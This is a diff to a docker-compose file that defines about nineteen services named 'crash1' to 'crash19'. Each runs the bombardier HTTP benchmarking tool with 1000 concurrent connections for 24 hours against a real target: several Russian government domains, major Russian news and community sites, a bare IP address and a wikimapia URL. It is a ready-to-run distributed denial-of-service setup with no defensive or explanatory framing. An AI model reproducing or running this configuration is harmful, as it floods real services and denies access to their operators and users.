@@ -3,58 +3,58 @@ services:
         crash1:
                 image: alpine/bombardier
                 command: "-c 1000 -t 2s -l -d 24h https://wikimapia.org/#lang=en&lat=50.584800&lon=30.489800&z=12&m=w&tag=516"
-        crash1:
-                image: alpine/bombardier
-                command: "-c 1000 -t 2s -l -d 24h https://185.169.155.16"
         crash2:
                 image: alpine/bombardier
-                command: "-c 1000 -t 2s -l -d 24h https://cloud.rkn.gov.ru"
+                command: "-c 1000 -t 2s -l -d 24h https://185.169.155.16"
         crash3:
                 image: alpine/bombardier
-                command: "-c 1000 -t 2s -l -d 24h https://mvd.gov.ru"
+                command: "-c 1000 -t 2s -l -d 24h https://cloud.rkn.gov.ru"
         crash4:
                 image: alpine/bombardier
-                command: "-c 1000 -t 2s -l -d 24h https://pwd.wto.economy.gov.ru"
+                command: "-c 1000 -t 2s -l -d 24h https://mvd.gov.ru"
         crash5:
                 image: alpine/bombardier
-                command: "-c 1000 -t 2s -l -d 24h https://stroi.gov.ru"
+                command: "-c 1000 -t 2s -l -d 24h https://pwd.wto.economy.gov.ru"
         crash6:
                 image: alpine/bombardier
-                command: "-c 1000 -t 2s -l -d 24h https://ria.ru"
+                command: "-c 1000 -t 2s -l -d 24h https://stroi.gov.ru"
         crash7:
                 image: alpine/bombardier
-                command: "-c 1000 -t 2s -l -d 24h https://gazeta.ru"
+                command: "-c 1000 -t 2s -l -d 24h https://ria.ru"
         crash8:
                 image: alpine/bombardier
-                command: "-c 1000 -t 2s -l -d 24h https://kp.ru"
+                command: "-c 1000 -t 2s -l -d 24h https://gazeta.ru"
         crash9:
                 image: alpine/bombardier
-                command: "-c 1000 -t 2s -l -d 24h https://riafan.ru"
+                command: "-c 1000 -t 2s -l -d 24h https://kp.ru"
         crash10:
                 image: alpine/bombardier
-                command: "-c 1000 -t 2s -l -d 24h https://pikabu.ru"
+                command: "-c 1000 -t 2s -l -d 24h https://riafan.ru"
         crash11:
                 image: alpine/bombardier
-                command: "-c 1000 -t 2s -l -d 24h https://kommersant.ru"
+                command: "-c 1000 -t 2s -l -d 24h https://pikabu.ru"
         crash12:
                 image: alpine/bombardier
-                command: "-c 1000 -t 2s -l -d 24h https://mk.ru"
+                command: "-c 1000 -t 2s -l -d 24h https://kommersant.ru"
         crash13:
                 image: alpine/bombardier
-                command: "-c 1000 -t 2s -l -d 24h https://yaplakal.com"
+                command: "-c 1000 -t 2s -l -d 24h https://mk.ru"
         crash14:
                 image: alpine/bombardier
-                command: "-c 1000 -t 2s -l -d 24h https://rbc.ru"
+                command: "-c 1000 -t 2s -l -d 24h https://yaplakal.com"
         crash15:
                 image: alpine/bombardier
-                command: "-c 1000 -t 2s -l -d 24h https://bezformata.com"
+                command: "-c 1000 -t 2s -l -d 24h https://rbc.ru"
         crash16:
                 image: alpine/bombardier
-                command: "-c 1000 -t 2s -l -d 24h https://shop-rt.com"
+                command: "-c 1000 -t 2s -l -d 24h https://bezformata.com"
         crash17:
                 image: alpine/bombardier
-                command: "-c 1000 -t 2s -l -d 24h https://mail.rkn.gov.ru"
+                command: "-c 1000 -t 2s -l -d 24h https://shop-rt.com"
         crash18:
+                image: alpine/bombardier
+                command: "-c 1000 -t 2s -l -d 24h https://mail.rkn.gov.ru"
+        crash19:
                 image: alpine/bombardier
                 command: "-c 1000 -t 2s -l -d 24h https://mail.rkn.gov.ru"
 
